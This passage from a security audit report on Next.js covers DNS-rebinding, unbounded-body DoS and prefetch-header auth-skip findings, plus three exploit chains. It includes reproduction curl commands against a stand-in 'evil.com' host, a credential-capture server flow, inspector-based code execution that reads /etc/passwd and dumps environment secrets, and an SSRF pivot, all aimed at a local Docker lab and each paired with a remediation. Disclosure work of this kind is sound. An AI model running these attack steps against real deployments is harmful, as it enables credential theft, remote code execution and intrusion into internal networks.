  "http://localhost:3002/__nextjs_source-map?filename=/app/app/page.tsx"
# Expected: non-403 (source map handler processed the request)

# launch-editor oracle also reachable
curl -s -o /dev/null -w '%{http_code}' \
  -H "Host: evil.com:3000" \
  "http://localhost:3002/__nextjs_launch-editor?file=app/page.tsx"
# Expected: 204 (file exists — all /__nextjs* endpoints bypassed)
```

**Evidence:**
- Explicit `Origin: http://evil.com` returns 403 — baseline protection confirmed
- `Host: evil.com:3000` with no Origin returns non-403 — `blockCrossSiteDEV` bypassed
- `/__nextjs_launch-editor` returns 204 — all dev endpoints reachable via DNS rebinding

**Remediation:**

Validate the `Host` header in `blockCrossSiteDEV`. If the `Host` header does not match `localhost`, `127.0.0.1`, `[::1]`, the configured hostname, or entries in `allowedDevOrigins`, block the request with 403. This prevents DNS-rebound requests with an attacker-controlled `Host` from passing the check even when `Origin` is absent.

---

## VULN-10: Edge Runtime Server Action Unbounded Body (DoS)

**Severity:** Medium

**Affected Code:**
- `packages/next/src/server/app-render/action-handler.ts:759` — explicit `// TODO: add body limit` comment; no size check anywhere in the edge block (lines 749-869)
- `packages/next/src/server/app-render/action-handler.ts:773` — `await req.request.formData()` reads the entire multipart body into memory without size limit
- `packages/next/src/server/app-render/action-handler.ts:851-862` — `while(true)` reader loop accumulates non-multipart body without size limit
- `packages/next/src/server/app-render/action-handler.ts:901-931` — `sizeLimitTransform` with 1MB default limit, used ONLY in the Node runtime path; absent from edge path

**Root Cause:**

The action handler has two paths: Node runtime (lines 875+) and edge runtime (lines 749-869). The Node path wraps the request body in `sizeLimitTransform`, which counts bytes and throws an `ApiError(413)` when the body exceeds the configured limit (default 1MB). This error is caught by the RSC error boundary (resulting in HTTP 500 to the client), but critically the body read is aborted before the full payload is buffered — the server is protected from memory exhaustion. The edge runtime path has an explicit `// TODO: add body limit` comment but no enforcement. All body reads in the edge path — both multipart (`formData()`) and non-multipart (reader loop) — are unbounded.

An attacker can send bodies exceeding the intended 1MB limit to any edge-runtime server action endpoint. While this is a defense-in-depth gap (the Node runtime enforces the limit but edge does not), practical DoS impact depends on the deployment platform's own body size limits and the server's available memory.

**Attack Scenario:**

A Next.js application uses `export const runtime = 'edge'` on a page or route handler (e.g., for low-latency response or Vercel Edge Network deployment) that also processes server actions. An attacker sends a series of multi-megabyte POST requests to the server action endpoint. The edge handler buffers the entire body before processing. With no limit, the attacker can send bodies exceeding the intended 1MB limit. The practical ceiling depends on the deployment platform's ingress limits (e.g., Vercel Edge Functions enforce their own body limits), but self-hosted deployments have no framework-level protection on this code path.

**Production impact:** This is exploitable with `next start` (production mode) against any page with `export const runtime = 'edge'` that accepts form submissions or server actions. No authentication required.

**Reproduction Steps:**

```bash
# Extract action IDs (42 hex chars)
ACTION_ID_EDGE=$(docker exec audit-edge-app \
  cat /app/.next/server/server-reference-manifest.json | grep -oE '[0-9a-f]{42}' | head -1)
ACTION_ID_NODE=$(docker exec audit-nextjs-app \
  cat /app/.next/server/server-reference-manifest.json | grep -oE '[0-9a-f]{42}' | head -1)

# Generate 2MB payload
dd if=/dev/zero bs=1024 count=2048 | tr '\0' 'A' > /tmp/2mb_payload

# Negative control — Node runtime rejects 2MB body (sizeLimitTransform enforced)
curl -s -o /dev/null \
  -X POST \
  -H "Next-Action: $ACTION_ID_NODE" \
  -H "Content-Type: text/plain;charset=UTF-8" \
  --data-binary @/tmp/2mb_payload \
  "http://localhost:3000/"
docker logs audit-nextjs-app 2>&1 | tail -20 | grep "Body exceeded"
# Expected: "Body exceeded 1 MB limit" in server logs

# Positive exploit — Edge runtime accepts 2MB body (no limit enforced)
curl -s -o /dev/null \
  -X POST \
  -H "Next-Action: $ACTION_ID_EDGE" \
  -H "Content-Type: text/plain;charset=UTF-8" \
  --data-binary @/tmp/2mb_payload \
  "http://localhost:3004/"
docker logs audit-edge-app 2>&1 | tail -20 | grep "Body exceeded"
# Expected: No "Body exceeded" message — body was fully buffered without limit
```

**Evidence:**
- Node runtime (port 3000) server logs contain `Body exceeded 1 MB limit` after receiving 2MB body — `sizeLimitTransform` enforcement confirmed (the 413 ApiError is caught by the RSC error boundary, so the HTTP response is 500, but the body was rejected before full buffering)
- Edge runtime (port 3004) server logs do NOT contain `Body exceeded` — 2MB body was fully buffered into memory without any size enforcement
- Explicit `// TODO: add body limit` comment at `action-handler.ts:759` confirms the missing protection is known

**Remediation:**

Add body size enforcement to the edge runtime path in `action-handler.ts`. Before calling `req.request.formData()` (line 773) or entering the reader loop (lines 851-862), count bytes via a `ReadableStream` transform and throw a 413 response if the byte count exceeds the configured limit (matching the Node default of 1MB). The `serverActions.bodySizeLimit` configuration value is already available at this point in the function.

---

## VULN-11: Route Oracle and SSR Skip via Unfiltered x-middleware-prefetch Header

**Severity:** High

**Affected Code:**
- `packages/next/src/server/lib/server-ipc/utils.ts:42-54` — `INTERNAL_HEADERS` list does not include `x-middleware-prefetch`; `filterInternalHeaders()` at `router-server.ts:231` therefore does not strip it from external requests
- `packages/next/src/server/base-server.ts:2171-2183` — prefetch bail-out: when `!isSSG && req.headers['x-middleware-prefetch']` is truthy and the page is not a 404/error page, the server short-circuits: returns HTTP 200 with body `{}`, sets `x-matched-path` and `x-middleware-skip` response headers, and skips all server-side rendering

**Root Cause:**

`x-middleware-prefetch` is an internal header set by Next.js's client-side router during prefetch requests. It is not in the `INTERNAL_HEADERS` filter list in `server-ipc/utils.ts`, so external clients can inject it freely. When present on a request to any dynamically rendered (non-SSG) page that is not a 404 or error page, the server at `base-server.ts:2171-2183` short-circuits entirely:

```typescript
// base-server.ts:2171-2183
if (
  !isSSG &&
  req.headers['x-middleware-prefetch'] &&
  !(is404Page || pathname === '/_error')
) {
  res.setHeader(MATCHED_PATH_HEADER, pathname)
  res.setHeader('x-middleware-skip', '1')
  res.setHeader('cache-control', 'private, no-cache, no-store, max-age=0, must-revalidate')
  res.body('{}').send()
  return null
}
```

All server-side rendering is skipped: server components, `getServerSideProps`, any auth checks, any SSR side effects (logging, rate limiting, analytics). While no protected content is returned (the body is always `{}`), the SSR skip means authentication logic, rate limiting, and server-side logging never execute for the request. The `x-matched-path` response header additionally leaks the matched route pattern.

**Attack Scenario:**

A Next.js production application has protected pages that enforce authentication inside server components (e.g., reading session cookies via `await cookies()`). This is a common pattern — the `/protected` page in this audit's test app follows it exactly. An external attacker sends any request with the `x-middleware-prefetch: 1` header. The server returns `{}` without executing the auth check: no logging, no rate limiting, no authorization checks. While protected content is not directly exfiltrated (the body is `{}`), the auth logic is completely bypassed.

The `x-matched-path` response header additionally functions as a route existence oracle: an attacker can probe any path and observe whether `x-matched-path` is returned in the response to enumerate hidden or internal routes.

**Reproduction Steps:**

```bash
# Negative control — normal request renders the page via SSR
curl -s "http://localhost:3000/protected"
# Expected: body contains "Access Denied" (SSR executed, auth check ran)

# Positive exploit — x-middleware-prefetch bypasses SSR entirely
curl -s -D /tmp/vuln11_headers.txt -o /tmp/vuln11_body.txt \
  -H "x-middleware-prefetch: 1" \
  "http://localhost:3000/protected"
# Expected: body is exactly "{}" (SSR skipped, auth check never executed)

# Route oracle — x-matched-path header leaks route pattern
grep -i "x-matched-path" /tmp/vuln11_headers.txt
# Expected: x-matched-path: /protected

# x-middleware-skip confirms bypass mechanism
grep -i "x-middleware-skip" /tmp/vuln11_headers.txt
# Expected: x-middleware-skip: 1
```

**Evidence:**
- Normal request to `/protected` returns `Access Denied` — SSR executed correctly
- Request with `x-middleware-prefetch: 1` returns `{}` — SSR completely bypassed, auth check skipped
- Response header `x-matched-path: /protected` — route oracle confirmed
- Response header `x-middleware-skip: 1` — internal bypass mechanism header leaked

**Remediation:**

Add `x-middleware-prefetch` to the `INTERNAL_HEADERS` array in `packages/next/src/server/lib/server-ipc/utils.ts`. This ensures the header is stripped from all incoming external requests before any processing, while still allowing legitimate internal prefetch requests from Next.js's own client-side router to function correctly (those requests are generated server-side and do not pass through the external header filter).

---

## Exploit Chains

The following chains combine individual vulnerabilities into end-to-end attack scenarios demonstrating critical real-world impact. Each chain is independently reproducible.

| Chain | Title | Severity | Components |
|-------|-------|----------|------------|
| CHAIN-1 | Credential Theft to Account Takeover | Critical | VULN-8 + VULN-7 |
| CHAIN-2 | Browser Visit to Full RCE (dev mode) | Critical | VULN-9 + VULN-5 |
| CHAIN-3 | Route Discovery to Auth Bypass to SSRF Pivot | Critical | VULN-11 + VULN-3 + VULN-1 |

---

### CHAIN-1: Credential Theft to Account Takeover

**Severity:** Critical

**Components:** VULN-8 (Middleware Rewrite SSRF with Credential Forwarding) + VULN-7 (Server Action CSRF Bypass via x-forwarded-host)

**Attack Narrative:**

An attacker sends a victim a phishing link pointing to the target Next.js application with a crafted `?backend=` parameter. The middleware unconditionally rewrites the request to the attacker's credential capture server, and `proxyRequest` forwards all of the victim's headers — including their session cookie and authorization token — to the attacker's server. The attacker then replays the stolen session cookie in a cross-origin server action request, injecting `x-forwarded-host: evil.com` alongside `Origin: https://evil.com` to satisfy the CSRF host-match check. The server action executes with the victim's identity, enabling account takeover with a single phishing click.

**Attack Flow:**

1. Victim clicks phishing link: `http://target.com/?backend=http://attacker-server/steal` with session cookie and Authorization header present in browser.
2. Middleware (VULN-8) rewrites request to `attacker-server/steal`; `proxyRequest` forwards `Cookie: session=VICTIM_TOKEN` and `Authorization: Bearer VICTIM_KEY`.
3. Attacker reads captured credentials from capture server logs (`CREDENTIAL_CAPTURED` entries).
4. Attacker posts to `http://target.com/` with `Next-Action: <id>`, `Cookie: session=VICTIM_TOKEN`, `Origin: https://evil.com`, `x-forwarded-host: evil.com` — CSRF check passes because `parseHostHeader` reads `x-forwarded-host` as the host value (VULN-7), matching the forged Origin.
5. Server action executes on behalf of the victim's session.

**Reproduction:**

```bash
bash autofyn_audit/exploits/chain_credential_theft_account_takeover.sh
```

**Evidence:**

- Step 1 confirms middleware rewrites victim request to capture server (HTTP 200).
- Step 2 confirms `CREDENTIAL_CAPTURED` lines containing chain-unique markers appear in `docker logs audit-credential-capture`.
- Step 4 confirms HTTP 200 with no `Invalid Server Actions request` in the body — CSRF bypass succeeded with stolen session.

**Real-World Impact:**

No vulnerability in isolation is as severe as their combination. VULN-8 alone requires the attacker to steal credentials; VULN-7 alone requires the attacker to already have credentials. Together they form a complete account takeover chain: a single phishing link harvests a victim's session and immediately leverages it to perform privileged server-side mutations. Any authenticated user who clicks a crafted link is fully compromised. This meets the bar for Critical severity under CVSS 3.1 (network-exploitable, no privileges required, high impact on confidentiality/integrity).

---

### CHAIN-2: Browser Visit to Full RCE (dev mode)

**Severity:** Critical

**Components:** VULN-9 (DNS Rebinding Bypass of blockCrossSiteDEV) + VULN-5 (Unauthenticated V8 Inspector Open via Dev Endpoint)

**Attack Narrative:**

A developer running `next dev` visits a malicious web page. The page performs DNS rebinding: after the developer's browser resolves the attacker's domain to the attacker's server and loads the page, the attacker's DNS TTL expires and the domain re-resolves to `127.0.0.1`. The malicious page then sends a same-origin request (from the browser's perspective) to `/__nextjs_attach-nodejs-inspector`. Because the browser sends no `Origin` header for the re-bound request, `blockCrossSiteDEV` short-circuits on the undefined origin and allows the request through, opening the V8 inspector. The attacker's page then connects to the inspector via CDP and executes arbitrary code in the developer's Node.js process: reading `/etc/passwd`, exfiltrating all environment variables and secrets, and writing persistent backdoor files.

**Attack Flow:**

1. Verify that explicit `Origin: http://evil.com` to `/__nextjs_attach-nodejs-inspector` is blocked (403) — protection exists.
2. DNS rebinding: send `GET /__nextjs_attach-nodejs-inspector` with `Host: evil.com:3000`, no `Origin` header — `blockCrossSiteDEV` sees `originLowerCase === undefined`, short-circuits to `false`, allows the request. Inspector opens (200) or confirms already open (500).
3. Fetch `http://localhost:9230/json/list` with `Host: localhost:9230` — obtain WebSocket debugger URL.
4. CDP `Runtime.evaluate`: `fs.readFileSync('/etc/passwd','utf-8')` — confirms `root:` in output.
5. CDP `Runtime.evaluate`: `JSON.stringify(process.env)` — confirms `REACT_EDITOR` and all runtime secrets accessible.
6. CDP `Runtime.evaluate`: `fs.readFileSync('/tmp/dev_secret.txt','utf-8')` — confirms `DEV_SECRET_KEY=sk-live-production-key-12345` exfiltrated.
7. CDP `Runtime.evaluate` (combined expression): `(fs.writeFileSync('/tmp/chain2_backdoor.txt','BACKDOOR_INSTALLED_BY_CHAIN2'), fs.readFileSync('/tmp/chain2_backdoor.txt','utf-8'))` — comma operator returns the string result, confirming persistent filesystem write.

**Reproduction:**

```bash
bash autofyn_audit/exploits/chain_dns_rebinding_to_rce.sh
```

**Evidence:**

- Step 1 confirms blockCrossSiteDEV is active.
- Step 2 confirms bypass: non-403 response with spoofed Host and no Origin.
- Steps 4-7 confirm unrestricted code execution: filesystem read, env var exfiltration, secret exfiltration, backdoor write.

**Real-World Impact:**

A developer running the Next.js dev server on their laptop is fully compromised by a single malicious web page visit. The attacker gains the ability to read all files accessible to the Node.js process (including `.env`, SSH keys, cloud credentials), exfiltrate all environment variables (including API keys and database passwords), and write persistent backdoors. This does not require any user interaction beyond visiting a page. While dev-mode, this is a realistic attack against developer workstations which commonly hold production credentials.

---

### CHAIN-3: Route Discovery to Auth Bypass to SSRF Pivot

**Severity:** Critical

**Components:** VULN-11 (Route Oracle and SSR Skip via x-middleware-prefetch) + VULN-3 (Server Actions Execute Without Origin Header) + VULN-1 (SSRF via Image Optimizer Redirect)

**Attack Narrative:**

An unauthenticated attacker begins by mapping the application's route structure using the `x-middleware-prefetch` route oracle (VULN-11): dynamic (non-SSG) routes return `x-matched-path` and body `{}`, SSG routes return HTTP 200 with normal content, while nonexistent routes return real 404 pages — a clear three-way signal that lets the attacker enumerate which routes exist and their rendering mode. Unlike CHAIN-1 and CHAIN-2 where each vulnerability enables the next, the components of CHAIN-3 are independently exploitable. Their combination demonstrates the breadth of unauthenticated attack surface rather than a single causal attack path. Having confirmed `/protected` is a real dynamic route, the attacker also observes that its server-side auth check is bypassed entirely (SSR skipped). The attacker then invokes a server action without any `Origin` header (VULN-3), which Next.js allows by design — enabling privileged mutations without CSRF protection. Finally, the attacker uses the image optimizer to pivot to an internal network host that is not in `remotePatterns` (VULN-1), by routing through an allowed redirect server and having the optimizer follow the redirect to the internal target.

**Attack Flow:**

1. Probe `/protected`, `/`, and `/nonexistent-abc123-probe` with `x-middleware-prefetch: 1`. Dynamic routes return `x-matched-path` + `{}`, SSG routes return HTTP 200, nonexistent routes return 404 — confirming the oracle discriminates.
2. Confirm SSR auth bypass: normal GET to `/protected` returns `Access Denied`; GET with `x-middleware-prefetch: 1` returns `{}` — auth check completely skipped.
3. Extract server action ID; POST to `/` with `Next-Action`, `Cookie: session=victim_session`, no `Origin` header, body `[]`. HTTP 200 without `Invalid Server Actions request` — action executes without CSRF check.
4. Request `/_next/image?url=http://audit-redirect-server:8080/redirect-to-secret&w=3840&q=75`. Image optimizer follows the 302 to `audit-secret-server:9090`. Count of `SECRET_ACCESS` log entries increases — internal service reached.
5. Negative control: direct request to `audit-secret-server:9090` via image optimizer returns 400 (remotePatterns blocks it), confirming the redirect was required for the pivot.

**Reproduction:**

```bash
bash autofyn_audit/exploits/chain_recon_to_ssrf_pivot.sh
```

**Evidence:**

- Step 1 confirms route oracle: `/protected` and `/` identified as real routes; `/nonexistent-abc123-probe` distinguished as nonexistent.
- Step 2 confirms SSR auth bypass on the discovered protected route.
- Step 3 confirms server action executes without CSRF protection.
- Step 4 confirms SSRF pivot: `SECRET_ACCESS` log count increases after chain's request.
- Step 5 confirms remotePatterns is enforced for direct access — redirect was necessary.

**Real-World Impact:**

The attacker achieves three critical capabilities, each independently exploitable without authentication: mapping of the entire application route structure (including hidden/protected endpoints), bypassing server-side authentication on those routes, and reaching internal network services not exposed to the public internet. The SSRF pivot in particular can be used to access internal APIs, metadata services (e.g., AWS IMDS at `169.254.169.254`), or internal databases — turning a web application vulnerability into a cloud infrastructure compromise.

---

## Appendix: Test Environment

```
audit-net (Docker bridge network)
  |
  +-- audit-nextjs-app (3000:3000) — next start, production mode
  +-- audit-nextjs-app-test-headers (3001:3000) — next start, NEXT_PRIVATE_TEST_HEADERS=1
  +-- audit-nextjs-dev (3002:3000, 9230:9229) — next dev --webpack, NODE_OPTIONS=--inspect=0.0.0.0:9229
  +-- audit-middleware-app (3003:3000) — next start, production mode, middleware SSRF target
  +-- audit-edge-app (3004:3000) — next start, production mode, edge runtime server actions
  +-- audit-redirect-server (8080:8080) — issues 302 redirect to secret server
  +-- audit-secret-server (9090:9090) — serves JPEG, logs access
  +-- audit-credential-capture (9091:9091) — logs captured Cookie+Authorization headers
```

To reproduce all 14/14 findings (11 individual vulnerabilities + 3 exploit chains):
```bash
bash autofyn_audit/setup.sh
bash autofyn_audit/run_all_exploits.sh
bash autofyn_audit/teardown.sh
```
